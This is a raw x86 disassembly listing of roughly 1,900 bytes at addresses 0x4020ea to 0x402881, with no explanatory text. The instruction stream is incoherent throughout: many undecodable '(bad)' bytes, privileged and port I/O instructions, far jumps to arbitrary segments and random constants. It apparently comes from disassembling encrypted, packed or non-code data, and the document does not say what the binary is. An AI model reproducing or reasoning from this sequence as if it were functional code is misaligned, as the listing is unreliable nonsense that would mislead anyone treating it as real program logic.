  4020ea:	fidivr DWORD PTR [edx-0x6a2c2fc1]
  4020f0:	xlat   BYTE PTR ds:[ebx]
  4020f1:	fs out 0x8,al
  4020f4:	sbb    al,0x5a
  4020f6:	add    BYTE PTR [edi],al
  4020f8:	pop    ds
  4020f9:	cmp    BYTE PTR [ebx],dh
  4020fb:	cmp    ebx,DWORD PTR [esi-0x7d]
  4020fe:	shl    BYTE PTR [esi],0x8f
  402101:	ds cwde 
  402103:	into   
  402104:	ins    BYTE PTR es:[edi],dx
  402105:	loop   0x4020d9
  402107:	mov    edx,DWORD PTR [edi+0x72]
  40210a:	push   edx
  40210b:	loop   0x4020d5
  40210d:	jg     0x40218c
  40210f:	pusha  
  402110:	sub    DWORD PTR [esi],ecx
  402112:	mov    DWORD PTR [edi],edx
  402114:	lods   al,BYTE PTR ds:[esi]
  402115:	inc    edi
  402116:	mov    ah,0x8d
  402118:	cmp    al,0x62
  40211a:	lods   al,BYTE PTR ds:[esi]
  40211b:	andnps xmm5,xmm2
  40211e:	xchg   esp,eax
  40211f:	pop    edx
  402120:	retf   
  402121:	jnp    0x402177
  402123:	enter  0xc15d,0x2b
  402127:	into   
  402128:	fwait
  402129:	cld    
  40212a:	xor    ebp,DWORD PTR [edi+0x15]
  40212d:	sub    ecx,ebx
  40212f:	xchg   edx,eax
  402130:	dec    ebp
  402131:	nop
  402132:	jne    0x4020ea
  402134:	inc    eax
  402135:	pop    edx
  402136:	jo     0x4020ec
  402138:	pop    edi
  402139:	push   0xffffffc7
  40213b:	es popa 
  40213d:	sbb    al,0xa1
  40213f:	imul   DWORD PTR [esi-0x2c]
  402142:	test   eax,0xb5b0d7de
  402147:	xchg   ebp,eax
  402148:	cdq    
  402149:	dec    ecx
  40214a:	adc    ah,BYTE PTR [ebx]
  40214c:	jle    0x402158
  40214e:	pop    edx
  40214f:	jae    0x402144
  402151:	(bad)  
  402152:	or     edi,DWORD PTR [eax+edi*2]
  402155:	js     0x4020ee
  402157:	daa    
  402158:	mov    ebp,0x1ff1c68d
  40215d:	enter  0x24e0,0x58
  402161:	cmp    BYTE PTR [eax],cl
  402163:	cmp    al,0xd9
  402165:	sbb    BYTE PTR [ecx-0x60],bh
  402168:	das    
  402169:	test   DWORD PTR [eax+0x55],0x653f730f
  402170:	scas   eax,DWORD PTR es:[edi]
  402171:	loopne 0x402103
  402173:	jp     0x40212a
  402175:	mov    ah,dl
  402177:	fs inc esp
  402179:	out    dx,al
  40217a:	stos   BYTE PTR es:[edi],al
  40217b:	or     al,BYTE PTR [ebp-0x66d2bd6c]
  402181:	pop    edx
  402182:	shl    BYTE PTR [ebp-0x365595c9],1
  402188:	dec    edi
  402189:	icebp  
  40218a:	test   BYTE PTR [eax+0x1cb09b42],0x65
  402191:	neg    BYTE PTR [ebp-0x19]
  402194:	mov    al,0xe6
  402196:	test   DWORD PTR [edi+ecx*2],ebp
  402199:	test   DWORD PTR [esi+eiz*8-0x158941ba],ebp
  4021a0:	xchg   edx,eax
  4021a1:	mov    ebp,0xf5d531ab
  4021a6:	mov    ebp,0x223c9b80
  4021ab:	mov    eax,ds:0xdc628ad8
  4021b0:	popa   
  4021b1:	bound  ecx,QWORD PTR [ebp+0x5a]
  4021b4:	xchg   esi,eax
  4021b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021b7:	adc    edi,DWORD PTR [ecx+0x45]
  4021ba:	call   0x7fe630a6
  4021bf:	(bad)  
  4021c0:	loop   0x40217a
  4021c2:	imul   esp,DWORD PTR [edx+edx*1-0x39],0xffffffdc
  4021c7:	popf   
  4021c8:	jb     0x4021a7
  4021ca:	push   ebp
  4021cb:	and    BYTE PTR [eax-0x7c5f5f02],ah
  4021d1:	arpl   bp,di
  4021d3:	mov    gs,WORD PTR [eax-0x7301448c]
  4021d9:	sub    ebp,DWORD PTR [ebx]
  4021db:	sub    BYTE PTR [ecx-0x36b91792],bl
  4021e1:	push   cs
  4021e2:	sahf   
  4021e3:	xchg   esp,eax
  4021e4:	xchg   esi,eax
  4021e5:	or     dh,BYTE PTR [ebx-0x5]
  4021e8:	sub    al,0x8a
  4021ea:	or     ch,BYTE PTR [eax+0x71]
  4021ed:	in     al,dx
  4021ee:	mov    edx,edi
  4021f0:	pop    ecx
  4021f1:	rcr    BYTE PTR [ecx-0x2c2a5bde],1
  4021f7:	sahf   
  4021f8:	sub    ebx,ebx
  4021fa:	xlat   BYTE PTR ds:[ebx]
  4021fb:	sbb    DWORD PTR [edi-0x12],edi
  4021fe:	jg     0x4021cb
  402200:	adc    ebp,esi
  402202:	test   eax,0x95305782
  402207:	(bad)  
  402208:	retf   0xbe42
  40220b:	sti    
  40220c:	out    0x76,al
  40220e:	dec    ebp
  40220f:	int3   
  402210:	ins    DWORD PTR es:[edi],dx
  402211:	imul   edi,DWORD PTR [eax+0x1c],0x16
  402215:	push   0xf71f77d1
  40221a:	cdq    
  40221b:	adc    eax,0x76c6c9b7
  402220:	push   ebx
  402221:	test   eax,0x94a1009e
  402226:	jmp    0x4143:0xff39bdf0
  40222d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40222e:	mov    bh,0x90
  402230:	cld    
  402231:	mov    eax,ds:0x51bb03ad
  402236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402237:	mov    esp,0x4dd812f9
  40223c:	out    0x4b,al
  40223e:	sbb    al,BYTE PTR [ebx-0x8411c33]
  402244:	cdq    
  402245:	add    al,0xc0
  402247:	push   es
  402248:	outs   dx,DWORD PTR ds:[esi]
  402249:	add    al,0x6c
  40224b:	ds dec eax
  40224d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40224e:	cmp    al,0x49
  402250:	or     DWORD PTR [ebx],0xf4a9df8f
  402256:	(bad)  
  402257:	mul    BYTE PTR [edx-0x4ebaa997]
  40225d:	xchg   ecx,eax
  40225e:	push   edi
  40225f:	fisubr DWORD PTR [ecx-0xc]
  402262:	mov    cl,BYTE PTR [esi]
  402264:	leave  
  402265:	add    dl,cl
  402267:	push   eax
  402268:	cmp    DWORD PTR [edx-0x27],eax
  40226b:	and    BYTE PTR [esi+esi*8+0x25],dl
  40226f:	(bad)  
  402270:	(bad)  
  402271:	mov    dh,0xb0
  402273:	jp     0x402298
  402275:	mov    esi,0xa0e9c406
  40227a:	outs   dx,DWORD PTR ds:[esi]
  40227b:	pop    ebp
  40227c:	pushf  
  40227d:	cli    
  40227e:	adc    DWORD PTR [esi-0x23],esp
  402281:	or     ecx,DWORD PTR [ebx+0x15b050b6]
  402287:	xor    BYTE PTR [ecx-0x3d],bl
  40228a:	xor    eax,0x24066e07
  40228f:	les    ecx,FWORD PTR [esi+0x64]
  402292:	mov    ecx,0x1e15742e
  402297:	mov    ebx,0xc6f0ca48
  40229c:	push   ss
  40229d:	sbb    BYTE PTR [eax],ah
  40229f:	pop    ebp
  4022a0:	addr16 hlt 
  4022a2:	imul   BYTE PTR [eax+0x30]
  4022a5:	dec    edx
  4022a6:	adc    al,0x1
  4022a8:	fistp  QWORD PTR [ecx]
  4022aa:	jmp    ecx
  4022ac:	mov    edx,DWORD PTR [edx+0x3ffbd5aa]
  4022b2:	iret   
  4022b3:	out    0x3a,al
  4022b5:	(bad)  
  4022b6:	clc    
  4022b7:	jbe    0x402284
  4022b9:	test   DWORD PTR [eax-0xc9ec1f4],0x4b54e384
  4022c3:	lods   al,BYTE PTR ds:[esi]
  4022c4:	sub    DWORD PTR [edi+0x6f90b6c8],eax
  4022ca:	add    dh,BYTE PTR [edi+esi*4]
  4022cd:	push   ecx
  4022ce:	inc    BYTE PTR [esi+0x6b]
  4022d1:	dec    edi
  4022d2:	mov    ebp,0x623e25e7
  4022d7:	add    bl,ch
  4022d9:	lock cdq 
  4022db:	leave  
  4022dc:	(bad)  
  4022dd:	mov    esp,DWORD PTR [ebx+0x75]
  4022e0:	shl    DWORD PTR [eax+0x70],0x59
  4022e4:	mov    ebx,0x56938d45
  4022e9:	adc    al,0x4d
  4022eb:	(bad)  
  4022ec:	adc    al,0x97
  4022ee:	and    al,BYTE PTR [edi-0x2c264a41]
  4022f4:	scas   eax,DWORD PTR es:[edi]
  4022f5:	mov    ebx,0x2a1a2506
  4022fa:	mov    ch,0x13
  4022fc:	fsub   DWORD PTR ss:[edi]
  4022ff:	ss jno 0x40237d
  402302:	or     edi,DWORD PTR [edx+0x6cf75ad5]
  402308:	arpl   bp,cx
  40230a:	bnd jl 0x4022b8
  40230d:	(bad)  
  40230e:	imul   esi,DWORD PTR [edx+ebx*1-0x4],0x2
  402313:	pop    ecx
  402314:	shl    BYTE PTR [esi+0x4b],0x77
  402318:	test   DWORD PTR [ecx],edx
  40231a:	std    
  40231b:	test   dl,bl
  40231d:	bound  ebp,QWORD PTR [edi+0x51]
  402320:	int    0xcc
  402322:	je     0x4022df
  402324:	sti    
  402325:	aam    0xef
  402327:	xor    ebx,esp
  402329:	adc    al,0x8d
  40232b:	mov    dl,BYTE PTR [ecx]
  40232d:	enter  0x8508,0x1f
  402331:	pop    ss
  402332:	mov    DWORD PTR [ebx-0x428eb00b],edx
  402338:	das    
  402339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40233a:	test   eax,0x57c2b11b
  40233f:	js     0x4022c9
  402341:	pop    ds
  402342:	rol    DWORD PTR [ebp-0x54ebfd8b],0x2e
  402349:	mul    DWORD PTR [eax+0x6a]
  40234c:	outs   dx,DWORD PTR ds:[esi]
  40234d:	mov    bh,0x81
  40234f:	xchg   BYTE PTR [edi*8-0x5d544fcf],bl
  402356:	test   al,0xdb
  402358:	into   
  402359:	bound  eax,QWORD PTR [edx]
  40235b:	idiv   DWORD PTR [edi-0xc]
  40235e:	in     eax,dx
  40235f:	adc    eax,0xd7b70b94
  402364:	add    DWORD PTR [edx+0x9],ebp
  402367:	gs mov ecx,0x1062d467
  40236d:	push   edi
  40236e:	inc    ebp
  40236f:	retf   
  402370:	jmp    0x7a3b:0xb8fb4bd6
  402377:	sub    al,0xf1
  402379:	mov    dh,0x8c
  40237b:	cmc    
  40237c:	fwait
  40237d:	pop    esp
  40237e:	jno    0x4023bd
  402380:	dec    ecx
  402381:	push   ecx
  402382:	fwait
  402383:	(bad)  
  402384:	stos   BYTE PTR es:[edi],al
  402385:	not    BYTE PTR [ebx]
  402387:	call   0x5739:0x76045587
  40238e:	jbe    0x402320
  402390:	(bad)  
  402391:	jmp    0x402411
  402393:	js     0x5d8d38de
  402399:	xor    eax,0xcd305a51
  40239e:	jge    0x402400
  4023a0:	dec    esp
  4023a1:	mov    ebx,DWORD PTR [esi+eiz*8-0x1dc9c81b]
  4023a8:	inc    ecx
  4023a9:	xor    DWORD PTR [ebx],ebp
  4023ab:	sti    
  4023ac:	push   ecx
  4023ad:	jmp    0x4023aa
  4023af:	xor    ebx,DWORD PTR [edi-0x30]
  4023b2:	pop    ecx
  4023b3:	addr16 ret 
  4023b5:	rol    BYTE PTR [esi],0x33
  4023b8:	cmp    BYTE PTR [edi-0x7b],bl
  4023bb:	push   cs
  4023bc:	lock sub eax,esp
  4023bf:	add    DWORD PTR [edi-0x60],ecx
  4023c2:	xchg   edx,eax
  4023c3:	push   es
  4023c4:	arpl   WORD PTR [esi+0xa],si
  4023c7:	aas    
  4023c8:	adc    cl,BYTE PTR [eax+0x64]
  4023cb:	imul   edx,DWORD PTR [eax+edx*2+0x34618165],0x16
  4023d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023d4:	iret   
  4023d5:	idiv   DWORD PTR [eax-0x7f]
  4023d8:	bound  esp,QWORD PTR ds:0x2c511802
  4023de:	(bad)  
  4023df:	ja     0x402391
  4023e1:	out    dx,eax
  4023e2:	push   0xca76a0a0
  4023e7:	in     eax,0xfb
  4023e9:	sub    al,0x57
  4023eb:	repnz in al,dx
  4023ed:	aaa    
  4023ee:	repnz in al,dx
  4023f0:	fldenv ds:0xb9695e1a
  4023f6:	jb     0x4023f8
  4023f8:	data16 cmp al,0x29
  4023fb:	loopne 0x402427
  4023fd:	push   cs
  4023fe:	ds jmp 0x96f1:0x19e0cd8f
  402406:	xchg   DWORD PTR [ecx+0x48],ebp
  402409:	fwait
  40240a:	popf   
  40240b:	ds mov ebp,0x34814b3
  402411:	cmp    cl,BYTE PTR [edi]
  402413:	cmp    al,0x60
  402415:	cmp    eax,0x4f6006c9
  40241a:	lds    ebp,FWORD PTR [edi]
  40241c:	pop    ss
  40241d:	sbb    ah,0x2e
  402420:	in     al,dx
  402421:	pop    ds
  402422:	push   es
  402423:	outs   dx,BYTE PTR ds:[esi]
  402424:	cmc    
  402425:	jle    0x4023cf
  402427:	bnd jle 0x4023b8
  40242a:	call   FWORD PTR [ebx+0x18]
  40242d:	into   
  40242e:	xor    dh,BYTE PTR [edi+0x54]
  402431:	icebp  
  402432:	nop
  402433:	scas   al,BYTE PTR es:[edi]
  402434:	cmova  edi,edi
  402437:	test   bh,ah
  402439:	inc    esp
  40243a:	jo     0x4024b6
  40243c:	shl    DWORD PTR [esi+eax*1+0x90bf1a7],0x17
  402444:	in     al,dx
  402445:	pop    ss
  402446:	iret   
  402447:	pop    eax
  402448:	jo     0x40246a
  40244a:	out    dx,eax
  40244b:	inc    edi
  40244c:	cmc    
  40244d:	mov    esp,0x957a9975
  402452:	xchg   esi,eax
  402453:	push   edx
  402454:	scas   al,BYTE PTR es:[edi]
  402455:	pop    ss
  402456:	or     al,0xc
  402458:	mov    dh,BYTE PTR [edx]
  40245a:	lahf   
  40245b:	out    dx,al
  40245c:	xor    BYTE PTR [eax],ch
  40245e:	mov    edi,DWORD PTR [ebp-0x2e787a4]
  402464:	mov    DWORD PTR [ecx+edi*8],edx
  402467:	jbe    0x4024af
  402469:	retf   0xbb42
  40246c:	pop    eax
  40246d:	mov    esi,0x263b1372
  402472:	mov    ah,0xd7
  402474:	in     al,dx
  402475:	std    
  402476:	hlt    
  402477:	out    dx,eax
  402478:	sbb    dl,BYTE PTR [edx+0xa4b9e5d]
  40247e:	rol    ecx,1
  402480:	outs   dx,BYTE PTR ds:[esi]
  402481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402482:	addr16 mov eax,ds
  402485:	push   0x5fca114e
  40248a:	(bad)  
  40248b:	shl    bl,1
  40248d:	arpl   WORD PTR [ebp-0x5c4f869e],ax
  402493:	jl     0x4024f6
  402495:	ins    DWORD PTR es:[edi],dx
  402496:	xchg   ebx,eax
  402497:	xor    eax,0xf70cfc91
  40249c:	xor    ch,dh
  40249e:	clc    
  40249f:	outs   dx,BYTE PTR ds:[esi]
  4024a0:	aaa    
  4024a1:	cmp    BYTE PTR [edi-0x8098d7e],cl
  4024a7:	lea    edi,[eax]
  4024a9:	pusha  
  4024aa:	out    dx,eax
  4024ab:	in     al,0x5b
  4024ad:	daa    
  4024ae:	test   DWORD PTR [ebx-0x39daebe4],ebp
  4024b4:	and    al,0x76
  4024b6:	cmp    BYTE PTR [esi+0x61],dh
  4024b9:	mov    ah,0x13
  4024bb:	dec    esp
  4024bc:	cmp    ch,BYTE PTR [eax]
  4024be:	inc    eax
  4024bf:	and    al,0x47
  4024c1:	dec    edi
  4024c2:	into   
  4024c3:	mov    cl,0xf2
  4024c5:	ror    ah,cl
  4024c7:	fsubr  DWORD PTR [ebx]
  4024c9:	cmp    al,0x2c
  4024cb:	sub    al,0x99
  4024cd:	mov    dh,0xde
  4024cf:	cmp    DWORD PTR [edi+0x7d],esi
  4024d2:	cmc    
  4024d3:	cli    
  4024d4:	pop    edi
  4024d5:	inc    ebp
  4024d6:	sti    
  4024d7:	xor    eax,0xc5a8378d
  4024dc:	pushf  
  4024dd:	adc    eax,DWORD PTR [edx+eax*8]
  4024e0:	data16 fild DWORD PTR [ebp-0x6205ac21]
  4024e7:	scas   al,BYTE PTR es:[edi]
  4024e8:	fstp   TBYTE PTR [ebx-0x2039294a]
  4024ee:	(bad)  
  4024f0:	mov    eax,0xb94e66b3
  4024f5:	outs   dx,BYTE PTR ds:[esi]
  4024f6:	out    0x54,al
  4024f8:	movntps XMMWORD PTR [ecx+0x95ada86],xmm0
  4024ff:	push   ecx
  402500:	hlt    
  402501:	fisubr WORD PTR [ecx+0x1e]
  402504:	cdq    
  402505:	and    bl,cl
  402507:	mov    bl,0xe0
  402509:	dec    edi
  40250a:	lock sahf 
  40250c:	mul    BYTE PTR [ebx]
  40250e:	cli    
  40250f:	jmp    0xfa86ec27
  402514:	in     eax,0x59
  402516:	(bad)  
  402517:	sar    DWORD PTR [ecx],1
  402519:	jnp    0x4024cd
  40251b:	jb     0x402505
  40251d:	ss repnz and eax,0xedffec54
  402524:	jbe    0x402567
  402526:	sar    DWORD PTR [eax+0xa],1
  402529:	inc    ebx
  40252a:	retf   0x2216
  40252d:	icebp  
  40252e:	xor    DWORD PTR ds:0xee0a71e6,edi
  402534:	(bad)  
  402535:	repz ds in eax,0x37
  402539:	cmp    eax,DWORD PTR [ebp-0x45]
  40253c:	dec    ecx
  40253d:	dec    esp
  40253e:	push   0xffffffdb
  402540:	and    cl,BYTE PTR [ebp-0x7437dc17]
  402546:	and    BYTE PTR [ebp-0x6c648935],dh
  40254c:	pushf  
  40254d:	or     BYTE PTR [ecx],bl
  40254f:	sub    al,BYTE PTR [esi+0x51feb534]
  402555:	fbld   TBYTE PTR [ebp-0x15]
  402558:	push   ss
  402559:	outs   dx,DWORD PTR ds:[esi]
  40255a:	pop    esp
  40255b:	adc    eax,0x3e81be31
  402560:	(bad)  
  402561:	loope  0x4025e1
  402563:	rol    DWORD PTR [edi],1
  402565:	lods   eax,DWORD PTR ds:[esi]
  402566:	and    DWORD PTR [ebp-0x57db0610],edx
  40256c:	mov    ch,0xd2
  40256e:	out    dx,eax
  40256f:	ja     0x4025d3
  402571:	add    DWORD PTR [edx],esp
  402573:	mov    bl,BYTE PTR [ebx-0x61c1cf21]
  402579:	add    dh,BYTE PTR [edi]
  40257b:	xor    al,0xcf
  40257d:	fdivp  st(1),st
  40257f:	jge    0x4025ec
  402581:	(bad)  
  402582:	cmp    al,0x88
  402584:	iret   
  402585:	imul   BYTE PTR [ecx]
  402587:	shr    DWORD PTR [ecx],cl
  402589:	into   
  40258a:	fstp   QWORD PTR [edx-0x4f85817d]
  402590:	lds    ebp,FWORD PTR [edi+0x27]
  402593:	dec    edx
  402594:	pop    esi
  402595:	outs   dx,BYTE PTR ds:[esi]
  402596:	imul   di,sp,0x30
  40259a:	fdivp  st(6),st
  40259c:	retf   
  40259d:	cmp    ch,cl
  40259f:	pop    esi
  4025a0:	pop    ebp
  4025a1:	stos   BYTE PTR es:[edi],al
  4025a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025a3:	mov    ah,0x2
  4025a5:	jbe    0x4025b3
  4025a7:	icebp  
  4025a8:	inc    edx
  4025a9:	sub    al,0xfd
  4025ab:	inc    ecx
  4025ac:	int3   
  4025ad:	rcl    DWORD PTR [eax+0x68],0x11
  4025b1:	push   cs
  4025b2:	sbb    ebx,DWORD PTR [eax+0x18a51ff7]
  4025b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025b9:	ins    BYTE PTR es:[edi],dx
  4025ba:	add    bl,al
  4025bc:	xor    BYTE PTR [esi],bh
  4025be:	adc    al,0x7b
  4025c0:	fdiv   st,st(7)
  4025c2:	mov    ds:0x4f710cb6,eax
  4025c7:	add    cl,BYTE PTR [ebp+0x1c]
  4025ca:	mov    DWORD PTR [ebx+eiz*8],eax
  4025cd:	jmp    0xab207c33
  4025d2:	and    esi,esi
  4025d4:	mov    cl,0xb7
  4025d6:	int    0x9e
  4025d8:	ret    0xfb3
  4025db:	inc    esp
  4025dc:	mov    edi,0x314822be
  4025e1:	(bad)  
  4025e2:	adc    eax,0x2b8ea13
  4025e7:	ja     0x402657
  4025e9:	push   eax
  4025ea:	icebp  
  4025eb:	fldcw  WORD PTR ss:[ecx+ebp*1]
  4025ef:	out    dx,al
  4025f0:	or     cl,dh
  4025f2:	pop    eax
  4025f3:	adc    al,0xd
  4025f5:	jmp    0x402590
  4025f7:	cmp    ebp,DWORD PTR [ecx+0x148714a2]
  4025fd:	push   esp
  4025fe:	dec    ecx
  4025ff:	je     0x402649
  402601:	add    eax,0x82a11c3a
  402606:	mov    edi,0xd49836e4
  40260b:	out    dx,al
  40260c:	stos   DWORD PTR es:[edi],eax
  40260d:	and    esi,DWORD PTR [esi+0x54738c36]
  402613:	imul   al
  402615:	xor    BYTE PTR [ecx],0x60
  402618:	or     al,BYTE PTR [edi-0x3ada02ca]
  40261e:	rol    DWORD PTR ds:0x4b5a083,0x35
  402625:	cdq    
  402626:	rcl    edx,cl
  402628:	int    0xa6
  40262a:	mov    edx,0x26f8442d
  40262f:	std    
  402630:	and    esi,ecx
  402632:	jl     0x4025f6
  402634:	jmp    0xdd9423e9
  402639:	ins    DWORD PTR es:[edi],dx
  40263a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40263b:	out    0x72,eax
  40263d:	sbb    al,0x62
  40263f:	pop    edx
  402640:	imul   DWORD PTR [edi-0x103eb983]
  402646:	jg     0x4025ff
  402648:	ins    BYTE PTR es:[edi],dx
  402649:	push   0xffffff87
  40264b:	fwait
  40264c:	ds mov dh,0xb9
  40264f:	sbb    DWORD PTR [edi+0x6d],eax
  402652:	je     0x402655
  402654:	mov    ah,0xa3
  402656:	dec    ecx
  402657:	test   eax,0x4f1dcd83
  40265c:	and    esi,DWORD PTR [eax]
  40265e:	jb     0x40266a
  402660:	lahf   
  402661:	jo     0x402656
  402663:	mov    ds:0xa2701181,eax
  402668:	(bad)  
  402669:	sysret 
  40266b:	loopne 0x402606
  40266d:	pop    ds
  40266e:	sub    al,0x18
  402670:	mov    edx,0x64e2f3df
  402675:	imul   eax,DWORD PTR fs:[ebp+0x12a204d9],0x25
  40267d:	loop   0x4026c8
  40267f:	xchg   ebp,eax
  402680:	push   esp
  402681:	inc    eax
  402682:	jae    0x4026da
  402684:	inc    ebx
  402685:	das    
  402686:	pop    edi
  402687:	fsubr  QWORD PTR [edx]
  402689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40268a:	adc    al,0x32
  40268c:	stc    
  40268d:	mov    bh,0x22
  40268f:	adc    BYTE PTR [ebx-0x3c],bl
  402692:	cmp    BYTE PTR [ecx+0x7cd870e9],al
  402698:	jb     0x4026b8
  40269a:	rcr    BYTE PTR [edx-0x6cbab819],1
  4026a0:	ret    
  4026a1:	ror    DWORD PTR [edx],0x7
  4026a4:	shr    DWORD PTR [edi+0x6f],cl
  4026a7:	pop    ds
  4026a8:	jno    0x4026b0
  4026aa:	lahf   
  4026ab:	xor    edi,0x4658a150
  4026b1:	or     ebx,DWORD PTR [esi]
  4026b3:	mov    dh,0xd1
  4026b5:	add    eax,0x2a202f44
  4026ba:	fmul   QWORD PTR [ebx-0x1e]
  4026bd:	push   0xffffff90
  4026bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026c0:	mov    ecx,0xbeb87b2e
  4026c5:	lods   eax,DWORD PTR ds:[esi]
  4026c6:	xchg   esp,esp
  4026c8:	scas   al,BYTE PTR es:[edi]
  4026c9:	sub    al,0xe
  4026cb:	arpl   WORD PTR [eax],bx
  4026cd:	cmp    al,0x3c
  4026cf:	rcr    BYTE PTR [ecx+0x278a2b03],0xa0
  4026d6:	dec    esp
  4026d7:	fwait
  4026d8:	test   BYTE PTR ds:0xc42f795b,bl
  4026de:	popf   
  4026df:	stc    
  4026e0:	fmul   QWORD PTR [ecx+ebp*2+0x1]
  4026e4:	fmul   DWORD PTR [ebp+0x38]
  4026e7:	sbb    dh,0x6d
  4026ea:	fidiv  WORD PTR [ebx]
  4026ec:	(bad)  
  4026ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026ee:	mov    edx,0x84c48d81
  4026f3:	jg     0x402703
  4026f5:	add    BYTE PTR [eax-0x7e],bl
  4026f8:	cdq    
  4026f9:	aaa    
  4026fa:	pop    es
  4026fb:	mov    cl,0x31
  4026fd:	pushf  
  4026fe:	cmp    esi,ecx
  402700:	push   0x8fbfbc98
  402705:	add    ebp,DWORD PTR [ecx+0x6dca4d55]
  40270b:	ret    
  40270c:	imul   ecx,DWORD PTR [eax-0x2],0x25ccfb18
  402713:	xor    dl,cl
  402715:	stos   BYTE PTR es:[edi],al
  402716:	test   eax,0xb3d994ea
  40271b:	jp     0x402721
  40271d:	xlat   BYTE PTR ds:[ebx]
  40271e:	push   es
  40271f:	cli    
  402720:	xchg   edi,eax
  402721:	or     BYTE PTR [edx+edi*4],dh
  402724:	adc    DWORD PTR [esi+0x69],esi
  402727:	fcmovb st,st(1)
  402729:	sbb    DWORD PTR [esi+0xf3f59e6],ebx
  40272f:	pop    eax
  402730:	imul   esi,DWORD PTR [esi+0x7b],0xbf183754
  402737:	xor    eax,0x2a
  40273a:	out    0xf9,eax
  40273c:	pop    ecx
  40273d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40273e:	ins    DWORD PTR es:[edi],dx
  40273f:	push   ss
  402740:	mov    ecx,0x164500a2
  402745:	leave  
  402746:	scas   eax,DWORD PTR es:[edi]
  402747:	xchg   DWORD PTR ds:0x468e4139,eax
  40274d:	fcmovbe st,st(1)
  40274f:	push   esp
  402750:	neg    DWORD PTR [ebp-0x53731aea]
  402756:	cs or  BYTE PTR ss:[edx-0x3ad8b9b9],ah
  40275e:	cmc    
  40275f:	dec    bh
  402761:	fwait
  402762:	push   edx
  402763:	(bad)  
  402764:	pop    esi
  402765:	(bad)  
  402766:	dec    edi
  402767:	dec    esp
  402768:	mov    ah,0x63
  40276a:	pop    es
  40276b:	shl    edx,cl
  40276d:	inc    edi
  40276e:	test   BYTE PTR [edx],0x28
  402771:	dec    ebp
  402772:	or     al,0xb4
  402774:	div    DWORD PTR [edi+0x6a]
  402777:	dec    esi
  402778:	je     0x402732
  40277a:	(bad)  
  40277b:	(bad)  
  40277c:	aad    0x7c
  40277e:	repnz stos DWORD PTR es:[edi],eax
  402780:	ret    
  402781:	push   0xffffffba
  402783:	jge    0x40270f
  402785:	or     eax,0x49463b75
  40278a:	nop
  40278b:	cmp    esi,esp
  40278d:	add    BYTE PTR ds:0x4289172c,0xd7
  402794:	add    DWORD PTR [eax-0x1de5365e],0xffffffbc
  40279b:	push   eax
  40279c:	sbb    al,0x27
  40279e:	mov    esi,0x70fcc356
  4027a3:	test   DWORD PTR [ebp+0x2a],edx
  4027a6:	(bad)  
  4027a7:	leave  
  4027a8:	jecxz  0x4027fa
  4027aa:	jmp    0xa6f3:0x8b636097
  4027b1:	xor    edx,eax
  4027b3:	retf   
  4027b4:	push   cs
  4027b5:	add    al,0x27
  4027b7:	sub    BYTE PTR [edx-0x1ba4bee1],dl
  4027bd:	nop
  4027be:	stos   BYTE PTR es:[edi],al
  4027bf:	cwde   
  4027c0:	sub    ebx,edi
  4027c2:	and    cl,ch
  4027c4:	adc    eax,0x45e73dda
  4027c9:	scas   al,BYTE PTR es:[edi]
  4027ca:	cmp    BYTE PTR [eax+0x1ba66f4d],al
  4027d0:	ror    DWORD PTR [edx+edx*8+0x7a],0xa
  4027d5:	mov    edx,0xca98157e
  4027da:	mov    edi,0x48e36fd5
  4027df:	mov    ebx,0x8bf6699a
  4027e4:	add    bh,BYTE PTR [esi-0x2ba7f25a]
  4027ea:	jo     0x40281d
  4027ec:	inc    eax
  4027ed:	in     al,0x3c
  4027ef:	jmp    0x4027f2
  4027f1:	inc    edx
  4027f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027f3:	inc    edx
  4027f4:	dec    esp
  4027f5:	div    BYTE PTR [esi+0x42]
  4027f8:	dec    eax
  4027f9:	out    0x56,al
  4027fb:	hlt    
  4027fc:	int    0xa1
  4027fe:	jnp    0x4027f9
  402800:	call   0x786d9f99
  402805:	push   ebp
  402806:	jns    0x402872
  402808:	outs   dx,BYTE PTR ds:[esi]
  402809:	stos   BYTE PTR es:[edi],al
  40280a:	lods   al,BYTE PTR ds:[esi]
  40280b:	mov    dl,BYTE PTR [ecx]
  40280d:	retf   0xde15
  402810:	xor    DWORD PTR [edi+0x6d7a9e85],ebx
  402816:	arpl   WORD PTR [esp+esi*2-0x292b931a],si
  40281d:	loop   0x402801
  40281f:	push   0x669c15d7
  402824:	pop    ecx
  402825:	das    
  402826:	push   ds
  402827:	add    esi,DWORD PTR [ebp+0x5e]
  40282a:	mov    esi,0x256ca5d1
  40282f:	pop    es
  402830:	sbb    dl,bl
  402832:	aad    0xc0
  402834:	jno    0x40283a
  402836:	fwait
  402837:	jno    0x402882
  402839:	call   0xa48:0xea259bc8
  402840:	push   ebp
  402841:	dec    edx
  402842:	outs   dx,DWORD PTR ds:[esi]
  402843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402844:	mov    edi,0xf699a106
  402849:	xchg   ebp,eax
  40284a:	and    dh,BYTE PTR fs:[ecx-0x69f65517]
  402851:	(bad)  [edx+ebp*8-0x7f3fa422]
  402858:	mov    dh,0xef
  40285a:	ret    0x6d0c
  40285d:	push   ss
  40285e:	imul   dl
  402860:	mov    al,0x6b
  402862:	sub    edx,DWORD PTR [eax-0x4a]
  402865:	push   cs
  402866:	cld    
  402867:	pop    eax
  402868:	mov    fs,WORD PTR [esi+0x452cb880]
  40286e:	and    al,dh
  402870:	(bad)  
  402872:	mov    esp,0x94404d92
  402877:	lock dec BYTE PTR [eax+0x4f420820]
  40287e:	add    DWORD PTR [ebp+0x26],ecx
  402881:	sub    DWORD PTR [ecx],0x3
